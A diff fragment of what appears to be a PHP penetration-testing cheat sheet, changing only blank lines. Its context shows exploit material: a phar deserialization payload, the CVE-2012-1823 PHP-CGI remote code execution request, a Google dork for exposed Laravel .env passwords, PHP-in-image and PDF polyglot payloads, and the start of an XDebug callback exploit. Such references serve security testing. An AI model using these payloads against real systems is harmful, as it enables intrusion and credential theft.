@@ -345,7 +345,6 @@ popen
 curl_exec
 curl_multi_exec
 </code></pre>
-
 <h2 id="deserialization">Deserialization</h2>
 <h3 id="phar-deserialization">Phar deserialization</h3>
 <p>The unserialization of a <code>phar</code> wrapper is realized in any file operation. Thus,
@@ -362,7 +361,6 @@ $obj-&gt;args = &quot;id&quot;;
 # Then, we serialize the object to a file
 file_put_contents(&quot;/tmp/exploit.phar&quot;, serialize($obj));
 </code></pre>
-
 <p>Here is an example of exploitable functions:</p>
 <pre><code class="language-none">copy
 file_exists
@@ -395,30 +393,25 @@ stat
 touch
 unlink
 </code></pre>
-
 <h2 id="cve-2012-1823-rce-in-php-cgi">CVE-2012-1823: RCE in PHP-CGI</h2>
 <p>PHP-CGI up to version 5.3.12 and 5.4.2 is vulnerable to an argument injection.</p>
 <p>You can show the page source code:</p>
 <pre><code class="language-none">GET https://&lt;host&gt;/file.php?-s
 </code></pre>
-
 <p>Or even execute PHP scripts (or a remote code execution)</p>
 <pre><code class="language-none">POST https://&lt;host&gt;/file.php?-d%20allow_url_include%3d1%20-d%20auto_prepend_file%3dphp://input
 
 &lt;?php system('whoami'); ?&gt;
 </code></pre>
-
 <p>More details can be found on the Metasploit script <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/php_cgi_arg_injection.rb" target="_blank">here</a></p>
 <h2 id="laravel-configuration-file">Laravel configuration file</h2>
 <p>The Laravel configuration file is sometimes exposed on the Internet with a dotEnv
 file at the root level of the web server:</p>
 <pre><code class="language-none">https://&lt;host&gt;/.env
 </code></pre>
-
 <p>You can find vulnerable target using a Google dork:</p>
 <pre><code class="language-none">&quot;DB_PASSWORD&quot; filetype:env
 </code></pre>
-
 <h2 id="php-session-files">PHP session files</h2>
 <p>On PHP the directive <a href="https://www.php.net/manual/en/session.configuration.php#ini.session.save-path" target="_blank"><code>session.save_path</code></a>
 set the folder where PHP will store the session files. So the session files are
@@ -454,19 +447,16 @@ Extension</a> of a 1 pixel GIF:</p>
 00000010  00 00 01 00 01 00 00 02  00 21 fe 3c 3f 70 68 70  |.........!.&lt;?php|
 00000020  69 6e 66 6f 28 29 3b                              |info();|
 </code></pre>
-
 <h3 id="pdf">PDF</h3>
 <p>You can add a comment (<code>%</code>) on the PDF header:</p>
 <pre><code class="language-pdf">%PDF-1.2 %&lt;?phpinfo()?&gt;
 ...
 </code></pre>
-
 <h3 id="others-formats">Others formats</h3>
 <p>On most formats (mp3, jpg, ...) there is an <code>EOF</code> after what we can add the
 payload. So the easiest way is to append to a valid file our payload:</p>
 <pre><code class="language-bash">cat valid.jpg payload.php &gt; polyglot.php.jpg
 </code></pre>
-
 <h2 id="xdebug">XDebug</h2>
 <p>Make a request with the following parameters and header:</p>
 <pre><code class="language-http">GET /path/to/file.php?XDEBUG_SESSION_START=phpstorm HTTP/1.1
@@ -474,7 +464,6 @@ payload. So the easiest way is to append to a valid file our payload:</p>
 X-Forwarded-For: {YOUR_IP}
 HTTP_CLIENT_IP: {YOUR_IP}
 </code></pre>
-
 <p>Then on your server execute the following python script:</p>
 <pre><code class="language-python">#!/usr/bin/python2
 import socket
